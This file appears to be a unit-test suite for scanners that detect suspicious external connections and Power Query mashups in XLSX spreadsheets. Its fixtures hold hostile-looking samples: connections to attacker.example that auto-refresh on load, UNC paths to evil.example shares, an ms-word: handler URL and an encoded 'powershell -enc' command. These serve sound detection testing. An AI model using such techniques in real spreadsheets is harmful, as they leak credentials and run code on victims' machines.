'use strict';
// xlsx-extras.test.js — XlsxConnectionsScanner + XlsxDataMashupScanner.
//
// Both scanners take a JSZip-shaped object whose only contract is:
//   • `zip.file(path)` returns null OR an object with `.async('string')`.
//   • `zip.files` is { [path]: {...} } enumerable for the DataMashup scan.
// We drive them with hand-built fakes — far cheaper than vendoring JSZip
// into the unit-test harness, and the scanners depend on nothing else.

const test = require('node:test');
const assert = require('node:assert/strict');
const { JSDOM } = (() => {
  // Lazy-resolve jsdom only if available; if not, fall back to a tiny
  // DOMParser shim that handles our XML inputs (jsdom is the standard
  // way to get a DOMParser in node, but we keep this resilient to a
  // missing dev dep — the helper will use the fallback parser instead).
  try { return { JSDOM: require('jsdom').JSDOM }; }
  catch (e) { return { JSDOM: null }; }
})();

const { loadModules } = require('../helpers/load-bundle.js');

// --- DOMParser shim ---------------------------------------------------------
// We don't depend on jsdom; the scanners only need
//   doc.getElementsByTagName(name) and Element.getAttribute(name) and
//   doc.getElementsByTagName('parsererror').length.
// Provide a minimalist XML parser that supports: element open/close, attrs
// (single or double-quoted), self-close, text nodes, nested elements.

function parseXml(text) {
  const root = { tag: '#document', children: [], attrs: {}, _text: '' };
  const stack = [root];
  let i = 0;
  while (i < text.length) {
    if (text[i] === '<') {
      // Comment / declaration — skip
      if (text.startsWith('<?', i)) { const e = text.indexOf('?>', i); if (e === -1) break; i = e + 2; continue; }
      if (text.startsWith('<!--', i)) { const e = text.indexOf('-->', i); if (e === -1) break; i = e + 3; continue; }
      if (text.startsWith('<![CDATA[', i)) {
        const e = text.indexOf(']]>', i);
        if (e === -1) break;
        const t = text.slice(i + 9, e);
        stack[stack.length - 1]._text += t;
        i = e + 3;
        continue;
      }
      if (text[i + 1] === '/') {
        // close tag
        const e = text.indexOf('>', i);
        if (e === -1) break;
        stack.pop();
        i = e + 1;
        continue;
      }
      // open / self-close
      const e = text.indexOf('>', i);
      if (e === -1) break;
      const inner = text.slice(i + 1, e);
      const selfClose = inner.endsWith('/');
      const body = selfClose ? inner.slice(0, -1) : inner;
      const sp = body.search(/\s/);
      const tag = sp === -1 ? body : body.slice(0, sp);
      const rest = sp === -1 ? '' : body.slice(sp + 1);
      const attrs = {};
      const re = /([A-Za-z_:][\w:.\-]*)\s*=\s*("([^"]*)"|'([^']*)')/g;
      let m;
      while ((m = re.exec(rest)) !== null) attrs[m[1]] = m[3] !== undefined ? m[3] : m[4];
      const node = { tag, attrs, children: [], _text: '' };
      stack[stack.length - 1].children.push(node);
      if (!selfClose) stack.push(node);
      i = e + 1;
    } else {
      const e = text.indexOf('<', i);
      const t = e === -1 ? text.slice(i) : text.slice(i, e);
      stack[stack.length - 1]._text += t;
      i = e === -1 ? text.length : e;
    }
  }
  // Normalise so getElementsByTagName / getAttribute work like the DOM.
  function decorate(n) {
    n.getElementsByTagName = (name) => {
      const out = [];
      const walk = (x) => {
        for (const c of x.children) {
          // Strip namespace prefix for matching, mirroring the real DOM's
          // getElementsByTagName behaviour with literal "tag" strings.
          const local = c.tag.includes(':') ? c.tag.split(':').pop() : c.tag;
          if (c.tag === name || local === name) out.push(c);
          walk(c);
        }
      };
      walk(n);
      return out;
    };
    n.getAttribute = (k) => (n.attrs && k in n.attrs ? n.attrs[k] : null);
    n.textContent = (n._text || '') + n.children.map(c => (c._text || '')).join('');
    for (const c of n.children) decorate(c);
  }
  decorate(root);
  return root;
}

// Class form so the production code's `new DOMParser()` succeeds.
class FakeDomParser {
  parseFromString(text /* type */) { return parseXml(text); }
}

// --- Fake JSZip -------------------------------------------------------------
function fakeZip(files) {
  const wrappers = {};
  const fileMap = {};
  for (const [path, content] of Object.entries(files)) {
    wrappers[path] = {
      async: async (kind) => {
        if (kind === 'string') return content;
        if (kind === 'uint8array') return new TextEncoder().encode(content);
        return content;
      },
    };
    fileMap[path] = { dir: false };
  }
  return {
    file(path) { return wrappers[path] || null; },
    files: fileMap,
  };
}

// Constants for the IOC type comparisons.
const ctx = loadModules(
  ['src/constants.js', 'src/xlsx-extras.js'],
  {
    expose: ['XlsxConnectionsScanner', 'XlsxDataMashupScanner', 'IOC'],
    shims: { DOMParser: FakeDomParser },
  },
);
const { XlsxConnectionsScanner, XlsxDataMashupScanner, IOC } = ctx;

// ── XlsxConnectionsScanner ──────────────────────────────────────────────────

test('connections: missing xl/connections.xml → empty', async () => {
  const out = await XlsxConnectionsScanner.scan(fakeZip({}));
  assert.equal(out.length, 0);
});

test('connections: malformed xml → empty (no throw)', async () => {
  const xml = '<<<not actually xml>';
  const out = await XlsxConnectionsScanner.scan(fakeZip({ 'xl/connections.xml': xml }));
  // Our shim parser is tolerant; verify at minimum no throw and no IOCs
  // (no <connection> tags present).
  assert.ok(Array.isArray(out));
  assert.equal(out.length, 0);
});

test('connections: web URL connection (http) → URL IOC medium', async () => {
  const xml = `<?xml version="1.0"?>
    <connections xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
      <connection id="1" name="External" type="5">
        <webPr url="http://attacker.example/data.csv"/>
      </connection>
    </connections>`;
  const out = await XlsxConnectionsScanner.scan(fakeZip({ 'xl/connections.xml': xml }));
  assert.equal(out.length, 1);
  assert.equal(out[0].type, IOC.URL);
  assert.equal(out[0].url, 'http://attacker.example/data.csv');
  assert.equal(out[0].severity, 'medium');
  assert.match(out[0].note, /webPr/);
});

test('connections: refreshOnLoad="1" escalates web URL medium → high', async () => {
  const xml = `<connections>
    <connection id="1" name="Auto" type="5" refreshOnLoad="1">
      <webPr url="http://attacker.example/data.csv"/>
    </connection>
  </connections>`;
  const out = await XlsxConnectionsScanner.scan(fakeZip({ 'xl/connections.xml': xml }));
  const r = out.find(x => x.url.startsWith('http://attacker'));
  assert.ok(r);
  assert.equal(r.severity, 'high', 'auto-refresh removes macro warning gate');
  assert.match(r.note, /refreshOnLoad/);
});

test('connections: UNC path in odcFile → UNC_PATH IOC high', async () => {
  const xml = `<connections>
    <connection id="1" name="Smb" odcFile="\\\\evil.example\\share\\q.odc"/>
  </connections>`;
  const out = await XlsxConnectionsScanner.scan(fakeZip({ 'xl/connections.xml': xml }));
  const r = out.find(x => x.type === IOC.UNC_PATH);
  assert.ok(r, 'expected a UNC_PATH IOC');
  assert.equal(r.severity, 'high');
});

test('connections: connectionString Data Source= URL extracted', async () => {
  const xml = `<connections>
    <connection id="1" name="OleDb" type="4"
      connectionString="Provider=SQLOLEDB;Data Source=http://attacker.example/db;Initial Catalog=x"/>
  </connections>`;
  const out = await XlsxConnectionsScanner.scan(fakeZip({ 'xl/connections.xml': xml }));
  const r = out.find(x => x.url === 'http://attacker.example/db');
  assert.ok(r, `expected http URL extracted from connectionString, got ${JSON.stringify(out)}`);
  assert.equal(r.type, IOC.URL);
});

test('connections: dbCommand with PowerShell → IOC.PATTERN high', async () => {
  const xml = `<connections>
    <connection id="1" name="Cmd" type="1">
      <dbPr command="powershell -enc ZQBjAGgAbwA="/>
    </connection>
  </connections>`;
  const out = await XlsxConnectionsScanner.scan(fakeZip({ 'xl/connections.xml': xml }));
  const r = out.find(x => x.type === IOC.PATTERN);
  assert.ok(r);
  assert.equal(r.severity, 'high');
  assert.match(r.url, /powershell/);
});

test('connections: local relative ref does NOT emit', async () => {
  const xml = `<connections>
    <connection id="1" name="Local" odcFile="MyConn.odc"/>
  </connections>`;
  const out = await XlsxConnectionsScanner.scan(fakeZip({ 'xl/connections.xml': xml }));
  assert.equal(out.length, 0);
});

test('connections: ms-protocol handler ms-word: → URL high', async () => {
  const xml = `<connections>
    <connection id="1" name="Mz" odcFile="ms-word:ofe|u|http://evil.example/x.docx"/>
  </connections>`;
  const out = await XlsxConnectionsScanner.scan(fakeZip({ 'xl/connections.xml': xml }));
  const r = out.find(x => x.type === IOC.URL);
  assert.ok(r);
  assert.equal(r.severity, 'high');
});

// ── XlsxDataMashupScanner ───────────────────────────────────────────────────

test('mashup: no customXml → empty', async () => {
  const out = await XlsxDataMashupScanner.scan(fakeZip({}));
  assert.equal(out.length, 0);
});

test('mashup: customXml without DataMashup string → empty', async () => {
  const xml = '<?xml version="1.0"?><props><p>just metadata</p></props>';
  const out = await XlsxDataMashupScanner.scan(fakeZip({ 'xl/customXml/item1.xml': xml }));
  assert.equal(out.length, 0);
});

test('mashup: presence emits banner medium', async () => {
  const xml = '<?xml version="1.0"?>'
    + '<DataMashup xmlns="http://schemas.microsoft.com/DataMashup">BASE64BLOB==</DataMashup>';
  const out = await XlsxDataMashupScanner.scan(fakeZip({ 'xl/customXml/item1.xml': xml }));
  const banner = out.find(x => x.type === IOC.PATTERN && /Power Query/i.test(x.url));
  assert.ok(banner);
  assert.equal(banner.severity, 'medium');
});

test('mashup: http URL in envelope extracted as IOC.URL', async () => {
  const xml = '<?xml version="1.0"?>'
    + '<DataMashup>let Source = Web.Contents("http://attacker.example/m.txt") in Source</DataMashup>';
  const out = await XlsxDataMashupScanner.scan(fakeZip({ 'xl/customXml/item1.xml': xml }));
  const url = out.find(x => x.type === IOC.URL);
  assert.ok(url);
  assert.equal(url.url, 'http://attacker.example/m.txt');
  assert.equal(url.severity, 'medium');
});

test('mashup: UNC path in envelope → UNC_PATH high', async () => {
  const xml = '<?xml version="1.0"?>'
    + '<DataMashup>File.Contents("\\\\evil.example\\share\\m.csv")</DataMashup>';
  const out = await XlsxDataMashupScanner.scan(fakeZip({ 'xl/customXml/item1.xml': xml }));
  const unc = out.find(x => x.type === IOC.UNC_PATH);
  assert.ok(unc);
  assert.equal(unc.severity, 'high');
});

test('mashup: banner emitted only once across multiple item parts', async () => {
  const xml1 = '<DataMashup>a</DataMashup>';
  const xml2 = '<DataMashup>b</DataMashup>';
  const out = await XlsxDataMashupScanner.scan(fakeZip({
    'xl/customXml/item1.xml': xml1,
    'xl/customXml/item2.xml': xml2,
  }));
  const banners = out.filter(x => x.type === IOC.PATTERN && /Power Query/.test(x.url));
  assert.equal(banners.length, 1);
});

test('mashup: URL extraction is capped at 16 per part', async () => {
  let body = '<DataMashup>';
  for (let i = 0; i < 50; i++) body += ` http://e${i}.example/x`;
  body += '</DataMashup>';
  const out = await XlsxDataMashupScanner.scan(fakeZip({ 'xl/customXml/item1.xml': body }));
  const urls = out.filter(x => x.type === IOC.URL);
  assert.equal(urls.length, 16, 'cap defends against pathologic inputs');
});
